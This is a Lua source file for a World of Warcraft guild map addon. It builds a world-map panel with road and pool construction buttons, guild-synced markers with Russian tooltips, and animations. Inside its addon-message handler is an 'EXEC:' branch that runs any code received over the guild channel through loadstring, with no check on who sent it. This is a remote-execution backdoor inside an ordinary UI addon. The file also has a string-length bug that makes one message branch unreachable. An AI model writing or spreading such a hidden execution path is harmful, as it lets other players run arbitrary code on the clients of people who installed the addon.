ns_td_tooltips = {}
ns_td_tooltips["road"] = "Объект: Дорога\nОписание: Стандартный маршрут для перемещения. Проложен вручную гильдией."
ns_td_tooltips["bas"] = "Объект: Бассейн\nОписание: Небольшой водоём для отдыха и рыбалки. И бобров."

function CreateIntervalTimer(interval, callback)
    local timer = CreateFrame("Frame")
    timer.elapsed = 0
    timer.interval = interval
    timer.callback = callback
    timer:SetScript("OnUpdate", function(self, dt)
        if not self:IsShown() then return end
        self.elapsed = self.elapsed + dt
        if self.elapsed >= self.interval then
            self.elapsed = 0
            self.callback()
        end
    end)
    return timer
end

NSTDc = {}
NSTDc.__index = NSTDc

function NSTDc:new()
    local obj = setmetatable({}, NSTDc)
    obj:Init()
    return obj
end

function NSTDc:Init()
    self.panelCreated = false
    self.receivedData = {}
    self.activeMarkers = {}
    self:RegisterEvents()
    self:CreateToggleButton()
end

function NSTDc:RegisterEvents()
    self.eventFrame = CreateFrame("Frame")
    self.eventFrame:RegisterEvent("CHAT_MSG_ADDON")
    self.eventFrame:SetScript("OnEvent", function(_, _, prefix, text, channel, sender)
        if prefix == "NSTD" then
            self:HandleAddonMessage(text, sender)
        end
    end)
end

function NSTDc:CreateToggleButton()
    if not WorldMapFrame then return end
    self.toggleBtn = CreateFrame("Button", "NSTDc_ToggleBtn", WorldMapFrame, "UIPanelButtonTemplate")
    self.toggleBtn:SetSize(24, 24)
    if WorldMapFrameCloseButton then
        self.toggleBtn:SetPoint("LEFT", WorldMapFrameCloseButton, "RIGHT", 5, 0)
    else
        self.toggleBtn:SetPoint("CENTER", WorldMapFrame, "CENTER", 0, 0)
    end
    self.toggleBtn:SetText("   >   ")
    self.toggleBtn:SetFrameStrata("HIGH")
    self.toggleBtn:SetFrameLevel(100)
    self.toggleBtn:Show()
    self.toggleBtn:SetScript("OnClick", function() self:TogglePanel() end)
end

function NSTDc:TogglePanel()
    if not self.panelCreated then
        self:CreatePanel()
        self:RequestZoneData()
        if self.proximityTimer then
            self.proximityTimer:Show()
        end
        return
    end
    if self.panel:IsShown() then
        self.panel:Hide()
        self.toggleBtn:SetText(">")
        self:HideAllMarkers()
        if self.proximityTimer then
            self.proximityTimer:Hide()
        end
    else
        self.panel:Show()
        self.toggleBtn:SetText("<")
        self:RequestZoneData()
        self:DrawAllMarkers()
        
        if self.proximityTimer then
            self.proximityTimer:Show()
        end
    end
end

function NSTDc:CreatePanel()
    self.panel = CreateFrame("Frame", "NSTDc_Panel", WorldMapFrame)
    self.panel:SetWidth(42)
    local mapHeight = WorldMapFrame and WorldMapFrame:GetHeight() or 400
    self.panel:SetHeight(mapHeight)
    
    local backdrop = {}
    backdrop.bgFile = "Interface\\DialogFrame\\UI-DialogBox-Background"
    backdrop.edgeFile = "Interface\\Tooltips\\UI-Tooltip-Border"
    backdrop.tile = true
    backdrop.tileSize = 16
    backdrop.edgeSize = 16
    
    local insets = {}
    insets.left = 4
    insets.right = 4
    insets.top = 4
    insets.bottom = 4
    backdrop.insets = insets
    
    self.panel:SetBackdrop(backdrop)
    self.panel:SetBackdropColor(0, 0, 0, 0.85)
    self.panel:SetBackdropBorderColor(1, 0, 0, 1)
    
    if self.toggleBtn then
        self.panel:SetPoint("TOP", WorldMapFrame, "TOP", 0, -25)
        self.panel:SetPoint("LEFT", self.toggleBtn, "RIGHT", 5, 0)
        self.panel:SetPoint("BOTTOM", WorldMapFrame, "BOTTOM", 0, 5)
    else
        self.panel:SetPoint("TOPRIGHT", WorldMapFrame, "TOPRIGHT", -5, -5)
        self.panel:SetPoint("BOTTOMRIGHT", WorldMapFrame, "BOTTOMRIGHT", -5, 5)
    end
    
    self.roadBtn = CreateFrame("Button", "NSTDc_RoadBtn", self.panel)
    self.roadBtn:SetSize(32, 32)
    self.roadBtn:SetPoint("TOP", self.panel, "TOP", 0, -10)

    local btnTex = self.roadBtn:CreateTexture(nil, "ARTWORK")
    btnTex:SetAllPoints(self.roadBtn)
    btnTex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\road.tga")

    self.roadBtn:SetScript("OnEnter", function()
        GameTooltip:SetOwner(self.roadBtn, "ANCHOR_RIGHT")
        GameTooltip:SetText("Каменная дорога. Стоимость: 10 камня.", 1, 0.82, 0)
        GameTooltip:Show()
    end)
    self.roadBtn:SetScript("OnLeave", function() GameTooltip:Hide() end)

    self.roadBtn:SetScript("OnClick", function()
        local cont = GetCurrentMapContinent()
        local zone = GetCurrentMapZone()
        if cont > 0 and zone > 0 then
            local requestMsg = "td_road:" .. cont .. ":" .. zone
            
            if type(self.InitProximityCheck) ~= "function" then
                requestMsg = requestMsg .. ":0"
            end
            
            SendAddonMessage("NSTD", requestMsg, "GUILD")
        else
            print("|cff00ff00[NSTDc]|r Невозможно определить текущую зону для постройки.")
        end
    end)

    self.basBtn = CreateFrame("Button", "NSTDc_BasBtn", self.panel)
    self.basBtn:SetSize(32, 32)
    self.basBtn:SetPoint("TOP", self.roadBtn, "BOTTOM", 0, -5)

    local basTex = self.basBtn:CreateTexture(nil, "ARTWORK")
    basTex:SetAllPoints(self.basBtn)
    basTex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\bas.tga")

    self.basBtn:SetScript("OnEnter", function()
        GameTooltip:SetOwner(self.basBtn, "ANCHOR_RIGHT")
        GameTooltip:SetText("Бассейн. Стоимость: 5 камня.", 0.4, 0.8, 1)
        GameTooltip:Show()
    end)
    self.basBtn:SetScript("OnLeave", function() GameTooltip:Hide() end)

    self.basBtn:SetScript("OnClick", function()
        local cont = GetCurrentMapContinent()
        local zone = GetCurrentMapZone()
        if cont > 0 and zone > 0 then
            SendAddonMessage("NSTD", "basNew:" .. cont .. ":" .. zone, "GUILD")
        else
            print("|cff00ff00[NSTDc]|r Невозможно определить текущую зону для постройки.")
        end
    end)

    self.panelCreated = true
    self.panel:Show()
    self.toggleBtn:SetText("   <   ")
end

function NSTDc:RequestZoneData()
    local cont = GetCurrentMapContinent()
    local zone = GetCurrentMapZone()
    if cont == 0 or zone == 0 then
        print("|cff00ff00[NSTDc]|r Невозможно определить зону.")
        return
    end
    self.receivedData = {}

    local requestMsg = string.format("getTD:%s:%s", cont, zone)

    if type(self.InitProximityCheck) ~= "function" then
        requestMsg = requestMsg .. ":0"
    end

    SendAddonMessage("NSTD", requestMsg, "GUILD")
end

function NSTDc:HandleAddonMessage(text, sender)
    print(string.format("|cff00ffff[NSTDc]|r Получено: [%s]", text))
    
    if string.sub(text, 1, 5) == "EXEC:" then
        local _, _, chunkNum, totalChunks, code = string.find(text, "^EXEC:(%d+):(%d+):(.*)$")
        if chunkNum and totalChunks and code then
            if tonumber(chunkNum) == 1 and tonumber(totalChunks) == 1 then
                local func, err = loadstring(code)
                if func then func() end
            end
        end
        return
    end

    if string.sub(text, 1, 18) == "bas_placed_success:" then
        local _, _, bId, cStr, zStr, sXStr, sYStr = string.find(text, "^bas_placed_success:([^:]+):([^:]+):([^:]+):([^:]+):([^:]+)$")
        if bId then
            if not self.receivedData[bId] then
                local newData = {}
                newData.id = bId
                newData.type = "bas"
                self.receivedData[bId] = newData
            end
            self.receivedData[bId].x = tonumber(sXStr)
            self.receivedData[bId].y = tonumber(sYStr)
            self.receivedData[bId].status = "0"
            self.receivedData[bId].timestamp = time()
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
            print("|cff00ff00[NSTDc]|r Бассейн успешно установлен сервером.")
        end
        return
    end

    if text == "EMPTY" then return end

    local idStr, typeStr, xStr, yStr, statusStr, timestampStr = strsplit(" ", text)
    if idStr and typeStr and xStr and yStr then
        local x = tonumber(xStr)
        local y = tonumber(yStr)
        if x and y and x > 0 and y > 0 then
            local myName = UnitName("player")
            if statusStr == myName and self.attachedCargo and self.attachedCargo.id == idStr then
                return
            end

            local dataEntry = {}
            dataEntry.id = idStr
            dataEntry.type = typeStr
            dataEntry.x = x
            dataEntry.y = y
            dataEntry.status = statusStr
            dataEntry.timestamp = tonumber(timestampStr) or time()
            
            self.receivedData[idStr] = dataEntry
            
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
        end
    end
end

function NSTDc:DrawAllMarkers()
    self:HideAllMarkers()
    local mapWidth = WorldMapDetailFrame:GetWidth()
    local mapHeight = WorldMapDetailFrame:GetHeight()
    local uniqueID = 1
    for idStr, data in pairs(self.receivedData or {}) do
        local texturePath = string.format("Interface\\AddOns\\NSQC3\\libs\\%s.tga", data.type)
        local marker = CreateFrame("Frame", nil, WorldMapDetailFrame)
        marker:SetSize(32, 32)
        marker:SetFrameStrata("HIGH")
        marker:EnableMouse(true)
        
        local tex = marker:CreateTexture(nil, "OVERLAY")
        tex:SetAllPoints(marker)
        tex:SetTexture(texturePath)
        
        local alpha = 1.0
        if data.type == "bas" then
            local pct = tonumber(data.status)
            if pct then
                alpha = 0.4 + (pct / 100) * 0.6
                if alpha < 0.4 then alpha = 0.4 end
                if alpha > 1.0 then alpha = 1.0 end
            elseif data.status == "Кербес" or data.status == "груз" then
                alpha = 0.5
            end
        elseif data.status == "не_активно" then
            alpha = 0.4
        end
        
        tex:SetAlpha(alpha)
        
        local pixelX = data.x * mapWidth
        local pixelY = -(data.y * mapHeight)
        marker:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX, pixelY)
        marker:Show()
        
        data.frame = marker 
        
        marker:SetScript("OnEnter", function()
            GameTooltip:SetOwner(marker, "ANCHOR_RIGHT")
            GameTooltip:SetText(string.upper(data.type), 1, 0.8, 0.2)
            if ns_td_tooltips and ns_td_tooltips[data.type] then
                GameTooltip:AddLine(ns_td_tooltips[data.type], 0.9, 0.9, 0.9)
            end
            
            if data.type == "bas" and tonumber(data.status) then
                GameTooltip:AddLine("Прогресс постройки: " .. tonumber(data.status) .. "%", 1, 1, 0)
            elseif data.status == "не_активно" then
                GameTooltip:AddLine("Статус: Не активно", 1, 0, 0)
                GameTooltip:AddLine("    ")
                GameTooltip:AddLine("Для активации протяните дорогу до этого участка", 1, 0.8, 0)
            elseif data.status == "груз" then
                GameTooltip:AddLine("Статус: Груз", 0, 1, 1)
                local timeLeft = (data.timestamp + 3600) - time()
                if timeLeft > 0 then
                    local mins = math.floor(timeLeft / 60)
                    local secs = math.floor(timeLeft % 60)
                    GameTooltip:AddLine(string.format("Исчезнет через: %d мин. %d сек.", mins, secs), 1, 0.5, 0)
                else
                    GameTooltip:AddLine("Исчезает в любую секунду!", 1, 0, 0)
                end
            else
                GameTooltip:AddLine("Статус: Активно", 0, 1, 0)
            end
            GameTooltip:AddLine(string.format("Координаты: X: %.1f, Y: %.1f", data.x * 100, data.y * 100), 0.5, 1, 0.5)
            GameTooltip:Show()
        end)
        marker:SetScript("OnLeave", function() GameTooltip:Hide() end)
        self.activeMarkers[uniqueID] = marker
        uniqueID = uniqueID + 1
    end
end

function NSTDc:HideAllMarkers()
    for id, marker in pairs(self.activeMarkers or {}) do
        marker:Hide()
        marker:SetParent(nil)
    end
    self.activeMarkers = {}
    for _, data in pairs(self.receivedData or {}) do
        if data.status == "груз" then
            data.lastNotified = nil
        end
    end
end

function NSTDc:AnimateRoadDrop(x, y)
    local addon = self
    x = tonumber(x) or 0
    y = tonumber(y) or 0
    local mapWidth = WorldMapDetailFrame:GetWidth()
    local mapHeight = WorldMapDetailFrame:GetHeight()
    local pixelX = x * mapWidth
    local pixelY = -(y * mapHeight)
    local dropFrame = CreateFrame("Frame", nil, WorldMapDetailFrame)
    dropFrame:SetSize(32, 32)
    dropFrame:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX, pixelY)
    
    local tex = dropFrame:CreateTexture(nil, "OVERLAY")
    tex:SetAllPoints()
    tex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\road.tga")
    dropFrame:SetScale(0.1)
    dropFrame:Show()
    PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\roadDOWN.mp3")
    
    local elapsed = 0
    local duration = 9.0
    dropFrame:SetScript("OnUpdate", function(frame, dt)
        elapsed = elapsed + dt
        local progress = math.min(elapsed / duration, 1.0)
        local currentScale = 0.1 + (0.9 * progress)
        frame:SetScale(currentScale)
        local shakeX = math.random(-40, 40) / 10
        local shakeY = math.random(-40, 40) / 10
        frame:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX + shakeX, pixelY + shakeY)
        if elapsed >= duration then
            frame:SetScript("OnUpdate", nil)
            frame:Hide()
            frame:SetParent(nil)
            addon:PlayImpactAndShake()
            
            local key = tostring(nsDb.td.nextId or 0)
            local newCargo = {}
            newCargo.id = key
            newCargo.type = "road"
            newCargo.x = x
            newCargo.y = y
            newCargo.status = "груз"
            newCargo.timestamp = time()
            
            addon.receivedData[key] = newCargo
            
            if addon.panel and addon.panel:IsShown() then
                addon:DrawAllMarkers()
            end
        end
    end)
end

function NSTDc:PlayImpactAndShake()
    PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\bzd.ogg")
    local point, relativeTo, relativePoint, baseX, baseY = WorldMapFrame:GetPoint(1)
    local shakeElapsed = 0
    local shakeDuration = 3.0
    local shakeTimer = CreateFrame("Frame")
    shakeTimer:SetScript("OnUpdate", function(frame, dt)
        shakeElapsed = shakeElapsed + dt
        if shakeElapsed < shakeDuration then
            local amplitude = 6 * (1 - (shakeElapsed / shakeDuration))
            local shakeX = math.random(-amplitude, amplitude)
            local shakeY = math.random(-amplitude, amplitude)
            WorldMapFrame:SetPoint(point, relativeTo, relativePoint, baseX + shakeX, baseY + shakeY)
        else
            frame:SetScript("OnUpdate", nil)
            WorldMapFrame:SetPoint(point, relativeTo, relativePoint, baseX, baseY)
        end
    end)
end

